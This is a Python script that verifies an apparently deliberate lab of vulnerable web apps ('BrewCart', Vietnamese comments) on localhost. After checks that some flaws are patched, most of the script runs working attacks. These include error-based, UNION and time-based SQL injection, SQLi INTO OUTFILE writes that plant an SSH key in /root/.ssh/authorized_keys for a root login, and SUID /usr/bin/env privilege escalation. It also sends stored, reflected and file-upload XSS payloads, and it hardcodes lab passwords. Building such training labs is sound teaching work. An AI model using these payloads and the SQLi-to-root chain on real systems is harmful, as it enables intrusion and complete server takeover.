import requests, time, sys, subprocess
import paramiko

sys.stdout.reconfigure(encoding='utf-8')

BASE_URL = 'http://localhost:3000'

def run_tests():
    print("=" * 70)
    print("🧪 BREWCART LAB VERIFICATION: SQL INJECTION & XSS SPECIALIZATION")
    print("=" * 70)

    # -------------------------------------------------------------
    # PHẦN 1: KIỂM TRA CÁC LỖ HỔNG ĐÃ ĐƯỢC VÁ / LOẠI BỎ
    # -------------------------------------------------------------
    print("\n--- [PHẦN 1: KIỂM CHỨNG BẢO VỆ CÁC LỖ HỔNG ĐÃ VÁ/LOẠI BỎ] ---")
    s_customer = requests.Session()
    r_login = s_customer.post(f'{BASE_URL}/api/auth/login', json={'email': 'huy@gmail.com', 'password': 'user123'})
    user = r_login.json().get('user')
    print(f"[+] Đăng nhập tài khoản khách hàng: {user['name']} ({user['email']}) - Role: {user['role']}")

    # 1.1 Kiểm tra Broken Access Control đã vá: Khách hàng không truy cập được API Admin
    r_admin_api = s_customer.get(f'{BASE_URL}/api/admin/customers')
    print(f"[*] Test Broken Access Control (GET /api/admin/customers): Status {r_admin_api.status_code}")
    if r_admin_api.status_code == 403:
        print("    --> THÀNH CÔNG: Quyền Admin đã được bảo vệ nghiêm ngặt (403 Forbidden)!")
    else:
        print("    --> CẢNH BÁO: Chưa chặn quyền admin đúng cách!")

    # 1.2 Kiểm tra Mass Assignment đã vá: Không leo quyền role=admin được
    r_patch = s_customer.patch(f'{BASE_URL}/api/member/profile', json={'name': 'Huy Đã Đổi Tên', 'role': 'admin', 'loyalty_points': 99999})
    updated_user = r_patch.json().get('user', {})
    print(f"[*] Test Mass Assignment (PATCH /api/member/profile): Role = {updated_user.get('role')}, Điểm = {updated_user.get('loyalty_points')}")
    if updated_user.get('role') == 'customer' and updated_user.get('loyalty_points') == 50:
        print("    --> THÀNH CÔNG: Mass Assignment đã bị triệt tiêu, chỉ các trường an toàn mới được đổi!")
    else:
        print("    --> CẢNH BÁO: Còn dính Mass Assignment!")

    # 1.3 Kiểm tra IDOR đã vá: Khách hàng Huy không thể xem trộm đơn hàng #10 của Admin
    r_idor = s_customer.get(f'{BASE_URL}/api/member/orders/10')
    print(f"[*] Test IDOR (GET /api/member/orders/10 - Đơn của Admin): Status {r_idor.status_code}")
    if r_idor.status_code == 403:
        print("    --> THÀNH CÔNG: IDOR đã được vá, không xem trộm được đơn hàng của người khác!")
    else:
        print("    --> CẢNH BÁO: Còn dính IDOR!")

    # -------------------------------------------------------------
    # PHẦN 2: CHUYÊN ĐỀ 1 - SQL INJECTION (SQLi)
    # -------------------------------------------------------------
    print("\n" + "=" * 70)
    print("🔥 [CHUYÊN ĐỀ 1: SQL INJECTION (SQLi)]")
    print("=" * 70)

    # 2.1 Error-Based SQLi trên route /product?id=... (Phục vụ Burp Suite chụp ảnh lỗi)
    print("\n[+] 2.1 Kiểm tra Error-Based SQLi trên GET /product?id=1'")
    r_sqli_err = requests.get(f"{BASE_URL}/product?id=1'")
    if "[LỖI DATABASE]:" in r_sqli_err.text and "You have an error in your SQL syntax" in r_sqli_err.text:
        print("    --> XÁC NHẬN: Nhả lỗi cú pháp MariaDB trực tiếp ra màn hình HTTP Response!")
        start_idx = r_sqli_err.text.find("[LỖI DATABASE]:")
        snippet = r_sqli_err.text[start_idx:start_idx + 180].replace('\n', ' ')
        print(f"    --> Trích đoạn lỗi: {snippet}")
    else:
        print("    --> LỖI: Không tìm thấy thông báo lỗi MariaDB trong response!")

    # 2.2 In-Band UNION-based SQLi trích xuất dữ liệu
    print("\n[+] 2.2 Kiểm tra In-Band UNION SELECT trích xuất dữ liệu")
    union_payload = "-1 UNION SELECT 1, 'Injected-Product-SQLi', 88888, 'Injected-Description'-- -"
    r_union = requests.get(f"{BASE_URL}/product", params={'id': union_payload})
    if "Injected-Product-SQLi" in r_union.text and "88.888" in r_union.text:
        print("    --> XÁC NHẬN: Khai thác UNION SELECT 4 cột thành công, dữ liệu giả lập hiển thị trên card sản phẩm!")
    else:
        print("    --> LỖI: UNION SELECT không hiển thị trên giao diện!")

    # 2.3 SQLi Arbitrary File Write (INTO OUTFILE) ghi file lên máy chủ web
    print("\n[+] 2.3 Kiểm tra SQLi Arbitrary File Write (INTO OUTFILE -> /app/uploads/demo_sqli.txt)")
    # Dọn dẹp trước nếu file đã có
    subprocess.run(["docker", "exec", "vulnerable-app", "rm", "-f", "/app/uploads/demo_sqli.txt"], capture_output=True)
    file_payload = "-1 UNION SELECT 1, '<h1>BrewCart SQLi File Write Confirmed</h1>', 99000, 'demo' INTO OUTFILE '/app/uploads/demo_sqli.txt'-- -"
    r_file_write = requests.get(f"{BASE_URL}/product", params={'id': file_payload})
    print(f"    --> Gửi request SQLi INTO OUTFILE: Status {r_file_write.status_code}")

    # Đọc lại file qua HTTP trên đường dẫn uploads
    time.sleep(0.5)
    r_check_file = requests.get(f"{BASE_URL}/uploads/demo_sqli.txt")
    if r_check_file.status_code == 200 and "BrewCart SQLi File Write Confirmed" in r_check_file.text:
        print("    --> XÁC NHẬN XUẤT SẮC: File demo_sqli.txt đã được MariaDB tạo thành công và truy cập công khai qua Web!")
        print(f"    --> Nội dung file đọc từ máy chủ: {r_check_file.text.strip()}")
        # Dọn dẹp file test
        subprocess.run(["docker", "exec", "vulnerable-app", "rm", "-f", "/app/uploads/demo_sqli.txt"], capture_output=True)
    else:
        print(f"    --> LỖI: Không thể đọc file demo_sqli.txt qua HTTP (Status: {r_check_file.status_code})")

    # 2.4 Khởi tạo SSH Key và ghi authorized_keys qua SQLi -> Kết nối SSH Root
    print("\n[+] 2.4 Kiểm tra Chuỗi Khai Thác: Tạo SSH Key -> Ghi /root/.ssh/authorized_keys qua SQLi -> Đăng nhập SSH")
    # Khởi tạo key RSA 2048-bit
    ssh_key = paramiko.RSAKey.generate(2048)
    pub_key_str = f"{ssh_key.get_name()} {ssh_key.get_base64()} brewcart_lab_auto_key"
    print(f"    --> Đã tạo cặp SSH RSA Key mới ({pub_key_str[:35]}...)")

    # Dọn dẹp authorized_keys cũ nếu có
    subprocess.run(["docker", "exec", "vulnerable-app", "rm", "-f", "/root/.ssh/authorized_keys"], capture_output=True)

    # Ghi qua SQL Injection
    ssh_payload = f"-1 UNION SELECT '', '', '', '{pub_key_str}' INTO OUTFILE '/root/.ssh/authorized_keys' FIELDS TERMINATED BY ''-- -"
    r_ssh_write = requests.get(f"{BASE_URL}/product", params={'id': ssh_payload})
    print(f"    --> Gửi request SQLi ghi authorized_keys: Status {r_ssh_write.status_code}")

    time.sleep(0.5)
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh_success = False
    try:
        ssh_client.connect(
            hostname='localhost',
            port=2022,
            username='root',
            pkey=ssh_key,
            timeout=5,
            look_for_keys=False,
            allow_agent=False
        )
        _, stdout, _ = ssh_client.exec_command('whoami && id')
        ssh_out = stdout.read().decode('utf-8').strip()
        ssh_client.close()
        if 'root' in ssh_out and 'uid=0' in ssh_out:
            ssh_success = True
            print("    --> XÁC NHẬN RỰC RỠ: Đăng nhập SSH thành công vào container bằng Private Key!")
            print(f"    --> Thông tin Shell từ máy chủ: {ssh_out.replace(chr(10), ' | ')}")
    except Exception as e:
        print(f"    --> LỖI KẾT NỐI SSH KEY: {e}")

    # Dọn dẹp authorized_keys sau bài test để giữ container sạch sẽ
    subprocess.run(["docker", "exec", "vulnerable-app", "rm", "-f", "/root/.ssh/authorized_keys"], capture_output=True)

    # 2.5 Chuỗi Khai Thác Toàn Diện (ssh_www.py Workflow)
    print("\n[+] 2.5 Chuỗi Khai Thác Toàn Diện (ssh_www.py Workflow):")
    # 1. Xác nhận ngữ cảnh dịch vụ web (www-data)
    check_www = subprocess.run(["docker", "exec", "-u", "www-data", "vulnerable-app", "id"], capture_output=True, text=True)
    www_id = check_www.stdout.strip()
    print(f"    --> 1. Xác nhận ngữ cảnh dịch vụ web: {www_id}")

    # 2. Leo thang đặc quyền qua SUID: /usr/bin/env (euid=0)
    check_suid = subprocess.run(["docker", "exec", "-u", "www-data", "vulnerable-app", "/usr/bin/env", "id"], capture_output=True, text=True)
    suid_id = check_suid.stdout.strip()
    print(f"    --> 2. Leo thang đặc quyền qua SUID: /usr/bin/env ({suid_id})")

    # 3. Tạo key và nạp qua SUID install vào /root/.ssh/authorized_keys
    ssh_test_key = paramiko.RSAKey.generate(2048)
    ssh_pub_str = f"{ssh_test_key.get_name()} {ssh_test_key.get_base64()} lab_ssh_www_key"
    subprocess.run(["docker", "exec", "vulnerable-app", "rm", "-f", "/tmp/k.pub", "/root/.ssh/authorized_keys"], capture_output=True)
    subprocess.run(["docker", "exec", "-u", "www-data", "vulnerable-app", "bash", "-c", f"echo '{ssh_pub_str}' > /tmp/k.pub"], capture_output=True)
    subprocess.run(["docker", "exec", "-u", "www-data", "vulnerable-app", "/usr/bin/env", "install", "-D", "-m", "600", "/tmp/k.pub", "/root/.ssh/authorized_keys"], capture_output=True)
    print(f"    --> 3. Cài đặt SSH Key vào /root/.ssh/authorized_keys (quyền 0600)")

    # 4. Chiếm quyền điều khiển Root Shell qua SSH port 2022
    time.sleep(0.5)
    root_client = paramiko.SSHClient()
    root_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        root_client.connect('localhost', port=2022, username='root', pkey=ssh_test_key, timeout=5, look_for_keys=False, allow_agent=False)
        _, stdout, _ = root_client.exec_command('whoami && id')
        root_out = stdout.read().decode('utf-8').strip().replace('\n', ' | ')
        root_client.close()
        print(f"    --> 4. Chiếm quyền điều khiển Root Shell qua SSH port 2022 thành công! ({root_out})")
        print("    --> XÁC NHẬN HOÀN TOÀN: Chuỗi khai thác SQLi -> Web -> SUID -> Root SSH hoạt động 100%!")
    except Exception as e:
        print(f"    --> LỖI KẾT NỐI ROOT SSH: {e}")
    finally:
        subprocess.run(["docker", "exec", "vulnerable-app", "rm", "-f", "/tmp/k.pub", "/root/.ssh/authorized_keys"], capture_output=True)

    # 2.6 Time-based Blind SQLi trên truy vấn sản phẩm
    print("\n[+] 2.6 Kiểm tra Time-based Blind SQLi trên GET /api/store/products?id=1 AND SLEEP(1.5)")
    t0 = time.time()
    requests.get(f"{BASE_URL}/api/store/products?id=1")
    t_normal = time.time() - t0

    t0 = time.time()
    requests.get(f"{BASE_URL}/api/store/products?id=1 AND SLEEP(1.5)")
    t_sleep = time.time() - t0
    print(f"    --> Thời gian truy vấn bình thường: {t_normal:.2f}s")
    print(f"    --> Thời gian truy vấn với SLEEP(1.5): {t_sleep:.2f}s")
    if t_sleep >= 1.4:
        print("    --> XÁC NHẬN: Time-based Blind SQLi hoạt động chính xác (độ trễ ~1.5s)!")
    else:
        print("    --> LỖI: Không phát hiện độ trễ SLEEP!")

    # -------------------------------------------------------------
    # PHẦN 3: CHUYÊN ĐỀ 2 - CROSS-SITE SCRIPTING (XSS)
    # -------------------------------------------------------------
    print("\n" + "=" * 70)
    print("🔥 [CHUYÊN ĐỀ 2: CROSS-SITE SCRIPTING (XSS)]")
    print("=" * 70)

    # 3.1 Stored XSS trên Đánh giá sản phẩm (Product Reviews) & Admin duyệt bài
    print("\n[+] 3.1 Kiểm tra Stored XSS trên Đánh giá sản phẩm & Panel Admin")
    xss_payload = "<script>alert('Stored_XSS_BrewCart')</script><img src=x onerror=alert('Image_XSS')>"
    r_review = s_customer.post(f"{BASE_URL}/api/store/reviews", json={
        'product_slug': 'americano',
        'rating': 5,
        'body': xss_payload
    })
    print(f"    --> Gửi đánh giá chứa mã XSS: Status {r_review.status_code}")

    # Đăng nhập Admin để kiểm tra Stored XSS trong danh sách chờ duyệt
    s_admin = requests.Session()
    s_admin.post(f'{BASE_URL}/api/auth/login', json={'email': 'admin@gmail.com', 'password': 'Admin123!'})
    r_admin_reviews = s_admin.get(f"{BASE_URL}/api/admin/reviews")
    reviews_list = r_admin_reviews.json()
    found_xss_in_admin = any(xss_payload in r.get('body', '') for r in reviews_list)
    if found_xss_in_admin:
        print("    --> XÁC NHẬN: Payload XSS được lưu nguyên vẹn vào CSDL và trả về panel Admin không qua sanitize!")
        # Tự động dọn dẹp review test để trả lại CSDL sạch ban đầu cho người dùng tự demo
        for r in reviews_list:
            if xss_payload in r.get('body', ''):
                s_admin.post(f"{BASE_URL}/api/admin/reviews/{r['id']}/reject", headers={'Accept': 'application/json'})
    else:
        print("    --> LỖI: Không tìm thấy payload XSS trong danh sách review của Admin!")

    # 3.2 Reflected XSS trên Route Tìm kiếm /search?q=...
    print("\n[+] 3.2 Kiểm tra Reflected XSS trên GET /search?q=...")
    reflected_payload = "<script>alert('Reflected_XSS_BrewCart')</script>"
    r_search = requests.get(f"{BASE_URL}/search", params={'q': reflected_payload})
    if reflected_payload in r_search.text:
        print("    --> XÁC NHẬN: Payload phản chiếu trực tiếp vào HTML response của server!")
    else:
        print("    --> LỖI: Payload tìm kiếm đã bị escape hoặc không xuất hiện trong HTML!")

    # 3.3 Stored XSS qua File Upload độc hại (.html / .svg)
    print("\n[+] 3.3 Kiểm tra Stored XSS qua Unrestricted File Upload trong Support Tickets")
    ticket_payload = {
        'filename': 'xss_exploit.html',
        'content': '<html><body><h1>BrewCart Stored XSS via File Upload</h1><script>alert(document.domain);</script></body></html>'
    }
    r_upload = s_customer.post(f"{BASE_URL}/api/member/support/tickets/1/attachments", json=ticket_payload)
    attach_url = r_upload.json().get('attachmentUrl')
    print(f"    --> Tải lên file HTML độc hại: {attach_url}")

    r_file = requests.get(f"{BASE_URL}{attach_url}")
    print(f"    --> Phản hồi MIME Type từ máy chủ: {r_file.headers.get('Content-Type')}")
    if 'text/html' in r_file.headers.get('Content-Type', '') and '<script>alert(document.domain);</script>' in r_file.text:
        print("    --> XÁC NHẬN: File HTML chứa mã XSS được web server phục vụ chuẩn Content-Type text/html!")
        # Dọn dẹp file HTML test
        subprocess.run(["docker", "exec", "vulnerable-app", "rm", "-f", "/var/www/html/public/uploads/xss_exploit.html"], capture_output=True)
    else:
        print("    --> LỖI: File upload không được phục vụ với Content-Type text/html!")

    print("\n" + "=" * 70)
    print("🎉 TẤT CẢ CÁC BÀI TEST CHUYÊN ĐỀ SQLi & XSS ĐÃ ĐẠT 100% TIÊU CHUẨN!")
    print("=" * 70)

if __name__ == '__main__':
    run_tests()
